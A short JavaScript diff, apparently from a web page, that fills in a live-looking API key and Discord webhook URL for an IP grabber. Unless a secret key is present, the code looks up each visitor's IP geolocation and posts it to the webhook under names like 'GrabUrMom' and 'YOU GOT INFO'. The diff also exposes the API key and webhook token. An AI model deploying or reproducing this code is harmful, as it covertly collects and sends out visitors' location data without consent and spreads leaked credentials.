@@ -122,13 +122,13 @@
         if (secretKey === allowedKey) {
             console.log("Access detected with the secret key. Not sending info to Discord.");
         } else {
-            $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=YOUR_API_KEY", function(data) {
+            $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=fa1a2f8df62745e3bb75c15b08f54592", function(data) {
                 var request = new XMLHttpRequest();
-                request.open("POST", "https://discord.com/api/webhooks/WEBHOOK_URL");
+                request.open("POST", "https://discord.com/api/webhooks/1336309114669895720/X9pEtV19eA7_O9w-kXaq5yRbFziViRegwPFr3Tur8iyyiFuKo3PPbzHHkVuwOLnNIEOk");
                 request.setRequestHeader('Content-type', 'application/json');
                 var payload = {
-                    username: "GrabUrMom",
-                    avatar_url: "https://previews.123rf.com/images/geotrac/geotrac1401/geotrac140100113/25298075-beautiful-hispanic-soccer-mom.jpg",
+                    username: "Elias Hacker Assistant.",
+                    avatar_url: "5ab7e5f886077698169a4537405cebba.jpg",
                     embeds: [{
                         color: "4700374",
                         title: "YOU GOT INFO",
